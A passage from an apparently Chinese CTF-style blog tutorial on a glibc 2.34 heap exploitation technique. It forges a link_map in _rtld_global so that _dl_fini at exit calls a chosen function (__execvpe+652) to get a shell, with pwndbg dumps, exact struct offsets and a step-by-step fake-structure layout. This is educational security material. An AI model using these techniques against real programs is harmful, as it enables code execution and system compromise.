class=\"comment\">//#2</span></span><br><span class=\"line\">      _ns_main_searchlist = <span class=\"number\">0x7f56e43ba4e0</span>,</span><br><span class=\"line\">      _ns_global_scope_alloc = <span class=\"number\">0</span>,</span><br><span class=\"line\">      _ns_global_scope_pending_adds = <span class=\"number\">0</span>,</span><br><span class=\"line\">      libc_map = <span class=\"number\">0x7f56e4382000</span>,</span><br><span class=\"line\">      _ns_unique_sym_table = &#123;</span><br><span class=\"line\">        lock = &#123;</span><br><span class=\"line\">          mutex = &#123;</span><br><span class=\"line\">            __data = &#123;</span><br><span class=\"line\">              __lock = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __count = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __owner = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __nusers = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __kind = <span class=\"number\">1</span>,</span><br><span class=\"line\">              __spins = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __elision = <span class=\"number\">0</span>,</span><br><span class=\"line\">              __list = &#123;</span><br><span class=\"line\">                __prev = <span class=\"number\">0x0</span>,</span><br><span class=\"line\">                __next = <span class=\"number\">0x0</span></span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            __size = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">16</span> times&gt;, <span class=\"string\">&quot;\\001&quot;</span>, <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">22</span> times&gt;,</span><br><span class=\"line\">            __align = <span class=\"number\">0</span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">....    </span><br><span class=\"line\">  <span class=\"comment\">//展开数据会很多，但是只是对链表个节点信息的汇总</span></span><br></pre></td></tr></table></figure>\n<p>我们需要关注的是，</p>\n<p>​\t#1，_ns_loaded = 0x7f56e43ba220,\t这是整个链表的头节点，</p>\n<p>​\t#2， _ns_nloaded = 4, 这里知名个这个链表的节点个数，在 exit 后面加载的检查中，会要求_ns_nloaded 链表的节点不少于 3 个</p>\n<p>（后面我会给出相关的源码）</p>\n<p>然后对于每个节点，都是 link_map 结构体，我们利用第一个节点做一下简单说明 (省略了部分无关的数据)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> link_map *)<span class=\"number\">0x7f56e43ba220</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  l_addr = <span class=\"number\">94172888551424</span>,</span><br><span class=\"line\">  l_name = <span class=\"number\">0x7f56e43ba7c8</span> <span class=\"string\">&quot;&quot;</span>,</span><br><span class=\"line\">  l_ld = <span class=\"number\">0x55a655922000</span>,</span><br><span class=\"line\">  l_next = <span class=\"number\">0x7f56e43ba7d0</span>,\t\t\t<span class=\"comment\">//#3</span></span><br><span class=\"line\">  l_prev = <span class=\"number\">0x0</span>,\t\t\t\t\t\t\t</span><br><span class=\"line\">  l_real = <span class=\"number\">0x7f56e43ba220</span>,\t\t\t<span class=\"comment\">//#3</span></span><br><span class=\"line\">  l_ns = <span class=\"number\">0</span>,</span><br><span class=\"line\">  l_libname = <span class=\"number\">0x7f56e43ba7b0</span>,</span><br><span class=\"line\">  l_info = &#123;<span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922010</span>, <span class=\"number\">0x55a6559220f0</span>, <span class=\"number\">0x55a6559220e0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922090</span>, <span class=\"number\">0x55a6559220a0</span>, <span class=\"number\">0x55a655922120</span>, <span class=\"number\">0x55a655922130</span>, <span class=\"number\">0x55a655922140</span>, <span class=\"number\">0x55a6559220b0</span>, <span class=\"number\">0x55a6559220c0</span>, <span class=\"number\">0x55a655922020</span>, <span class=\"number\">0x55a655922030</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922100</span>, <span class=\"number\">0x55a6559220d0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922110</span>, <span class=\"number\">0x55a655922160</span>, <span class=\"number\">0x55a655922040</span>, <span class=\"number\">0x55a655922060</span>, <span class=\"number\">0x55a655922050</span>, <span class=\"number\">0x55a655922070</span>, <span class=\"number\">0x55a655922000</span>, <span class=\"number\">0x55a655922150</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922180</span>, <span class=\"number\">0x55a655922170</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922160</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a6559221a0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a655922190</span>, <span class=\"number\">0x0</span> &lt;repeats <span class=\"number\">25</span> times&gt;, <span class=\"number\">0x55a655922080</span>&#125;,\t\t\t<span class=\"comment\">//#4</span></span><br><span class=\"line\">  l_phdr = <span class=\"number\">0x55a65591d040</span>,</span><br><span class=\"line\">......</span><br><span class=\"line\">  l_direct_opencount = <span class=\"number\">1</span>,</span><br><span class=\"line\">  l_type = lt_executable,</span><br><span class=\"line\">  l_relocated = <span class=\"number\">1</span>,</span><br><span class=\"line\">  l_init_called = <span class=\"number\">1</span>,\t\t\t\t\t<span class=\"comment\">//#5</span></span><br><span class=\"line\">  l_global = <span class=\"number\">1</span>,</span><br><span class=\"line\">......</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们需要关注的：</p>\n<p>​\t#3，l_next = 0x7f56e43ba7d0, ，指向下一个 link_map 的指针，我们就是通过修改这个，将下一个节点劫持为我们伪造的 link_map</p>\n<p>​\t#4 , l_real = 0x7f56e43ba220 , 指向的的自身的地址，这里也是后面需要检查的地方。</p>\n<p>​\t#5,  l_init_called = 1, 简单说，就是为了绕过检查。</p>\n<p>下面是_dl_fini 函数的源码（我已经删除了部分注释及代码，源码路径为 glibc2.34/elf/dl-fini。c）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_dl_fini (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">...</span><br><span class=\"line\">\t  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">link_map</span> *<span class=\"title\">maps</span>[<span class=\"title\">nloaded</span>];</span>\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i;</span><br><span class=\"line\">\t  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">link_map</span> *<span class=\"title\">l</span>;</span></span><br><span class=\"line\">\t  assert (nloaded != <span class=\"number\">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t  <span class=\"keyword\">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class=\"number\">0</span>; l != <span class=\"literal\">NULL</span>; l = l-&gt;l_next)</span><br><span class=\"line\">\t    <span class=\"comment\">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class=\"line\">\t    <span class=\"keyword\">if</span> (l == l-&gt;l_real)\t\t\t\t\t\t<span class=\"comment\">//检查节点的地址是否跟自己结构体保存的一致</span></span><br><span class=\"line\">\t      &#123;</span><br><span class=\"line\">\t\tassert (i &lt; nloaded);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmaps[i] = l;</span><br><span class=\"line\">\t\tl-&gt;l_idx = i;</span><br><span class=\"line\">\t\t++i;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class=\"line\"><span class=\"comment\">\t\t   are not dlclose()ed from underneath us.  */</span></span><br><span class=\"line\">\t\t++l-&gt;l_direct_opencount;</span><br><span class=\"line\">\t      &#125;</span><br><span class=\"line\">\t  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class=\"line\">\t  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class=\"number\">1</span>);</span><br><span class=\"line\">\t  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> nmaps = i;</span><br><span class=\"line\"></span><br><span class=\"line\">\t  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class=\"line\">\t\t\t <span class=\"literal\">NULL</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class=\"line\"></span><br><span class=\"line\">\t  <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; nmaps; ++i)</span><br><span class=\"line\">\t    &#123;</span><br><span class=\"line\">\t      <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">link_map</span> *<span class=\"title\">l</span> =</span> maps[i];\t\t\t<span class=\"comment\">//l遍历link_map的链表</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t      <span class=\"keyword\">if</span> (l-&gt;l_init_called)\t\t\t\t\t<span class=\"comment\">//重要的检查点</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t  l-&gt;l_init_called = <span class=\"number\">0</span>;\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t  <span class=\"comment\">/* Is there a destructor function?  */</span></span><br><span class=\"line\">\t\t  <span class=\"keyword\">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class=\"literal\">NULL</span></span><br><span class=\"line\">\t\t      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class=\"literal\">NULL</span>))</span><br><span class=\"line\">\t\t    &#123;</span><br><span class=\"line\">\t\t      <span class=\"comment\">/* When debugging print a message first.  */</span></span><br><span class=\"line\">\t\t      <span class=\"keyword\">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class=\"line\">\t\t\t\t\t    &amp; DL_DEBUG_IMPCALLS, <span class=\"number\">0</span>))</span><br><span class=\"line\">\t\t\t_dl_debug_printf (<span class=\"string\">&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t  DSO_FILENAME (l-&gt;l_name),</span><br><span class=\"line\">\t\t\t\t\t  ns);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t      <span class=\"comment\">/* First see whether an array is given.  */</span></span><br><span class=\"line\">\t\t      <span class=\"keyword\">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t  ElfW(Addr) *<span class=\"built_in\">array</span> =</span><br><span class=\"line\">\t\t\t    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class=\"line\">\t\t\t\t\t    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class=\"line\">\t\t\t  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class=\"line\">\t\t\t\t\t    / <span class=\"keyword\">sizeof</span> (ElfW(Addr)));</span><br><span class=\"line\">\t\t\t  <span class=\"keyword\">while</span> (i-- &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t    ((<span class=\"type\">fini_t</span>) <span class=\"built_in\">array</span>[i]) ();\t\t\t\t\t<span class=\"comment\">//目标位置</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">....</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>总结下我们需要绕过那些检查</p>\n<ol>\n<li>\n<p>判断 <code>_ns_loaded</code>  链表中至少有三个节点（dl-fini 开始部分通过循环遍历链表，做检查，）</p>\n</li>\n<li>\n<p>检查 <code>l == l-&gt;l_real</code></p>\n</li>\n<li>\n<p>检查 <code>l-&gt;l_init_called &gt; 8</code>            这个其实跟数据的处理有关</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_relocated:<span class=\"number\">1</span>;\t<span class=\"comment\">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_init_called:<span class=\"number\">1</span>; <span class=\"comment\">/* Nonzero if DT_INIT function called.  */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_global:<span class=\"number\">1</span>;\t<span class=\"comment\">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_reserved:<span class=\"number\">2</span>;\t<span class=\"comment\">/* Reserved for internal use.  */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_phdr_allocated:<span class=\"number\">1</span>; <span class=\"comment\">/* Nonzero if the data structure pointed</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tto by `l_phdr&#x27; is allocated.  */</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> l_soname_added:<span class=\"number\">1</span>; <span class=\"comment\">/* Nonzero if the SONAME is for sure in</span></span><br></pre></td></tr></table></figure>\n<p>在 lunk_map 结构体中，这个变量是 4 字节，与结构体开始位置的偏移量为 0x31c。pwndbg 帮我们解释了数据的结果，这里的数据要大于 8，我们不妨之际设置为 9. 不同节点可以有所差异，下面是一个结果为 1 的数据</p>\n<p><img data-src=\"p4.png\" alt=\"p4\"></p>\n<p>以及一个不为 1 的数据</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> link_map *)<span class=\"number\">0x7f56e43ba7d0</span></span><br><span class=\"line\">$<span class=\"number\">5</span> = &#123;</span><br><span class=\"line\">  l_addr = <span class=\"number\">140725148598272</span>,</span><br><span class=\"line\">  l_name = <span class=\"number\">0x7ffd207e4371</span> <span class=\"string\">&quot;linux-vdso.so.1&quot;</span>,</span><br><span class=\"line\">  l_ld = <span class=\"number\">0x7ffd207e43e0</span>,</span><br><span class=\"line\">  l_next = <span class=\"number\">0x7f56e4382000</span>,</span><br><span class=\"line\">  l_prev = <span class=\"number\">0x7f56e43ba220</span>,</span><br><span class=\"line\">  l_real = <span class=\"number\">0x7f56e43ba7d0</span>,</span><br><span class=\"line\">...</span><br><span class=\"line\">  l_relocated = <span class=\"number\">1</span>,</span><br><span class=\"line\">  l_init_called = <span class=\"number\">0</span>,</span><br><span class=\"line\">  l_global = <span class=\"number\">0</span>,</span><br><span class=\"line\">...</span><br><span class=\"line\">pwndbg&gt; x/wx <span class=\"number\">0x7f56e43ba7d0</span>+<span class=\"number\">0x31c</span></span><br><span class=\"line\"><span class=\"number\">0x7f56e43baaec</span>:\t<span class=\"number\">0x00000005</span></span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>检查 <code>l-&gt;l_info[DT_FINI_ARRAY] != NULL</code> ，unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</p>\n</li>\n</ol>\n<p>​\tDT_FINI_ARRAY 宏定义为 26，DT_FINI_ARRAYSZ 宏定义为 28，所以 l_info [26], 以及 l_info [28] 不能是 null (28 是因为 i 会影响到函数 ((fini_t) array [i]) (); 调用)</p>\n<p>下面我们具体说说如何伪造，我选择利用修改第三节点的 l_next 指针，指向一个 chunk, 并在 chunk 上部署我们伪造的 link_map. 这里依赖任意地址写，可通过 largebin attack 实现，或者其他漏洞造成的可以任意地址写堆地址。第三节点的指针在哪？_rtld_global 符号并不在 libc 文件，而是在 ld.so 文件中，我们要泄露出程序的 ld 基址，pwndbg 为我们提供了一个函数求偏移量</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class=\"line\"><span class=\"number\">0x7f56e43b9040</span>-&gt;<span class=\"number\">0x7f56e4382018</span> is <span class=\"number\">-0x37028</span> bytes (<span class=\"number\">-0x6e05</span> words)</span><br></pre></td></tr></table></figure>\n<p>由此我们就知道了需要向哪里写入 chunk.</p>\n<p>接下来就是重点，我们如何伪造 link_map.</p>\n<p>因为原来的链表中只有 4 个节点，而我们伪造的 link_map 有恰是第四个，所以，l_next 就是 0，l_prve 无所谓，直接写 0 即可。l_real 就是我们的伪造的 link_map 的开始地址，也是我们修改后的第三节点的 l_next 的值。这几个值离 link_map 的首地址很近，可以很直接的看出偏移量。接下来就是 l_info 的伪造。l_info [26] 不为 0，这是结构体内的数组，distance 可以得到 info [26] info [28] 关于节点地址的偏移量，同样我们可以得到上面提到的 l_init_called 的偏移量</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[<span class=\"number\">26</span>]</span><br><span class=\"line\"><span class=\"number\">0x7f56e43ba220</span>-&gt;<span class=\"number\">0x7f56e43ba330</span> is <span class=\"number\">0x110</span> bytes (<span class=\"number\">0x22</span> words)</span><br><span class=\"line\">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[<span class=\"number\">28</span>]</span><br><span class=\"line\"><span class=\"number\">0x7f56e43ba220</span>-&gt;<span class=\"number\">0x7f56e43ba340</span> is <span class=\"number\">0x120</span> bytes (<span class=\"number\">0x24</span> words)</span><br><span class=\"line\">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_init_called</span><br><span class=\"line\"><span class=\"number\">0x7f56e43ba220</span>-&gt;<span class=\"number\">0x7f56e43ba53c</span> is <span class=\"number\">0x31c</span> bytes (<span class=\"number\">0x63</span> words)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>重点来了，info 这连个位置我们写入什么数据</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  l_info = &#123;<span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a656f072f8</span>, <span class=\"number\">0x8</span>, <span class=\"number\">0x7f56e4244cec</span> &lt;__execvpe+<span class=\"number\">652</span>&gt;, <span class=\"number\">0xa</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a656f072e0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x55a656f072e8</span>, <span class=\"number\">0xa</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x9</span>, <span class=\"number\">0xa</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>, <span class=\"number\">0x0</span>&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t  ElfW(Addr) *<span class=\"built_in\">array</span> =</span><br><span class=\"line\">\t\t\t    (ElfW(Addr) *) (l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class=\"line\">\t\t\t  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val/ <span class=\"keyword\">sizeof</span> (ElfW(Addr)));</span><br><span class=\"line\">\t\t\t  <span class=\"keyword\">while</span> (i-- &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t    ((<span class=\"type\">fini_t</span>) <span class=\"built_in\">array</span>[i]) ();\t\t\t\t\t<span class=\"comment\">//目标位置</span></span><br></pre></td></tr></table></figure>\n<p>这是一个比较通用的 info，0x7f56e4244cec &lt;__execvpe+652&gt; 是我们想要执行的函数。</p>\n<p>我们再看源码的相关部分，正常情况下，exit 使用的就是第四个节点的 l_info 的数据，也就是使用我们伪造的 info。</p>\n<p>sizeof (ElfW (Addr)) = 8，为了方便解释，我们将这里 l-&gt;l_info [DT_FINI_ARRAYSZ] 的数据记为 ptr，ptr-&gt;d_un.d_ptr, 其实就是 ptr+0x8 所指向的数据。ptr 是我们要伪造的数据，他是堆中的一个可控制的位置。我们想要执行一次就可以获得 shell，我们不妨让 i =1, 然后我们需要在 ptr+8 的位置写入的就是 1*8=8</p>\n<p>我们还要确定的是 arry 数组。(l-&gt;l_addr+ l-&gt;l_info [DT_FINI_ARRAY]-&gt;d_un.d_ptr);</p>\n<p>l-&gt;addr 其实就是我们伪造的 link_map 开始的位置，个人喜欢将这里写为 0，然后将 l_info [26] 写入另外一个地址，两者加起来就是数组的初始位置。我们记录这个地址为 ptr_a, 这个就会给 arry 赋值，然后\tarry [i]\t====&gt;&gt;  就是调用 ptr_a +8*i 位置的函数。也就是我们的后门。</p>\n<p>提供一个构造的布局，</p>\n<p>在 <code>fake+0x110</code>  写入一个 ptr_a，且 ptr_a+0x8 处有 ptr，ptr 处写入的是最后要执行的函数地址.</p>\n<p>在 <code>fake+0x120</code>  写入一个 ptr，且 ptr+0x8 处是 <code>i*8</code> 。</p>\n<p>我选择的是 <code>fake+0x110</code>  写入 <code>fake+0x40</code> ，在 <code>fake+0x48</code>  写入 <code>fake+0x58</code> ，在 <code>fake+0x58</code>  写入 shell</p>\n<p>我选择在 <code>fake+0x120</code>  写入 <code>fake+0x48</code> ，在 <code>fake+0x50</code>  处写入 8.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; tel <span class=\"number\">0x55a656f072a0</span>(fake) <span class=\"number\">40</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│  <span class=\"number\">0x55a656f072a0</span> ◂— <span class=\"number\">0x0</span>\t\t\t\t\t\t\t<span class=\"comment\">//l_addr</span></span><br><span class=\"line\">... ↓     <span class=\"number\">4</span> skipped</span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│  <span class=\"number\">0x55a656f072c8</span> —▸ <span class=\"number\">0x55a656f072a0</span> ◂— <span class=\"number\">0x0</span>\t\t\t\t<span class=\"comment\">//l_real</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span 